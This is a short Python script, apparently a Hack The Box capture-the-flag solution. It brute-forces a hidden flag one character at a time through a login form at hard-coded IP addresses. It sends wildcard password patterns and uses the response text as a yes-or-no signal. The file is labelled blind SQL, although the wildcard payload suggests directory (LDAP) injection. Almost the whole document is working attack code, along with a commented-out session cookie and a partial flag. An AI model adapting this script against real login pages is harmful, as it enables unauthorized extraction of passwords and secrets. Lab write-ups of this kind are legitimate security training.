# Python

```
#Blind sql py

import requests



# cookies = {
#     'mysession': 'MTY0MjQwNDEyMnxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fOdmR0HbQ-VEfWqHcmrz_pJA6UdwUhACCDUGWZE_4TEr',
# }

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://167.99.89.198:31584',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.137 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://167.99.89.198:31584/login',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
}

alphabet = [
    'a','b','c','d','e','f','g','h','k','l','i','j','m','n','o','p','q','r','s','t','u','v','w','x','z','y',
    'A','B','C','D','E','F','G','H','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Z','Y',
    '!','"','#','$','%','&',"'",'(',')','+',',','-','.','/',':',';','<','=','>','?','@','[',']','^','_','`','{','}','~',
    '1','2','3','4','5','6','7','8','9','0'
]

host = 'http://206.189.125.57:32059/login'

data = {
  #'username': '*',
  'username': 'reese',
  'password': '*'
}

bruted_phrase = 'HTB{d1rectory_h4xx0r_'


flag = 1
while flag == 1:
    flag = 0
    for letter in alphabet:
        data ['password'] = bruted_phrase + letter + '*'
        response = requests.post(host, headers=headers, 
        #cookies=cookies,
        data=data, verify=False)
        if('No search results' in response.text):
            bruted_phrase += letter
            flag = 1
            print(bruted_phrase)
            break
print('Final')


```
